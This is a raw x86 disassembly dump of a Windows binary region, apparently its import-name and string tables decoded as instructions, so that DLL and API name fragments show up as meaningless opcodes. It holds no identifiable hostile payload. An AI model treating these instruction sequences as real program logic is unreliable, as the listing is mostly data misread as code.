  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	(bad)  
  413ba9:	ss inc ebx
  413bab:	add    BYTE PTR [edx+0x68],dh
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
